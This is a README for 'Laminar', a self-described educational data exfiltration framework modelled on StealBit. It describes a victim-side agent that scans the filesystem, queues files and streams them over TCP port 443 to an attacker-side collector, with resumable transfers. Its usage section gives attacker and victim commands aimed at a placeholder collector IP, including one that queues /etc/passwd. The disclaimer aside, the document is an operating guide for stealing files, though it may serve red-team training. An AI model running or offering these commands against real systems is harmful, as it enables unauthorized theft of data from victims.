# Laminar Exfiltration Toolkit

This repository contains a simulated Linux-based exfiltration framework for educational and training purposes only.
It demonstrates file discovery, local IPC queuing, and resumable TCP uploads to a remote collector, similar to capabilities seen in real exfiltration tools like StealBit.

> ⚠️ **For educational and authorized use only.**
> Do not use this tool on systems you do not own or lack explicit permission to operate on.


## Key Features

| File                   | Description                                                           |
| ---------------------- | --------------------------------------------------------------------- |
| `laminar.py`           | Client-side agent with file scanner, IPC queue, and TCP upload worker |
| `laminar_collector.py` | Server-side collector with resumable transfers and safe storage       |


1. **Agent (`laminar.py`)**:
   * Runs on the victim host.
   * Scans filesystem paths for files matching size and extension filters.
   * Uses Unix domain socket IPC to enqueue discovered files for exfiltration.
   * Maintains a persistent TCP connection to the collector for uploads.
   * Supports resumable transfers using offset-based protocol negotiation.
   * Allows scanning, queuing, and uploading to run in separate processes.

2. **Collector (`laminar_collector.py`)**:
   * Runs on the attacker host.
   * Listens for TCP connections from Laminar agents.
   * Validates framing protocol and prevents path traversal attacks.
   * Resumes interrupted transfers without resending completed data.
   * Writes partial files with `.part` extension until fully received.
   * Logs mapping between stored filenames (hash) and original paths.


## Usage

### 1. Start Collector (Attacker side)

```bash
python3 laminar_collector.py --bind 0.0.0.0 --port 443 --recv-dir ./recv
```

### 2. Run Agent in Server Mode (Victim side)

```bash
python3 laminar.py --mode server --remote-host <COLLECTOR_IP> --remote-port 443
```

### 3. Scan and Queue Files (Victim side)

```bash
python3 laminar.py --mode scan --roots /home /srv --min-mb 10 --max-mb 500
```

It is possible to scan a specific file: 

```bash
python3 laminar.py --mode queue --path /etc/passwd
```

## Notes 

### Resume logic
1) On HEAD, collector looks up the destination filename from the path.
2) If that file already exists (partial from a previous attempt), we get its
   size (offset) and reply with that value (OKOF + offset).
3) Sender seeks to "offset" in the source file and continues streaming DATA
   frames until "file_size" bytes total are present.
4) When file is complete, the collector expects EOF!, sends DONE, and may
   rename the temporary ".part" to ".done" (purely cosmetic).
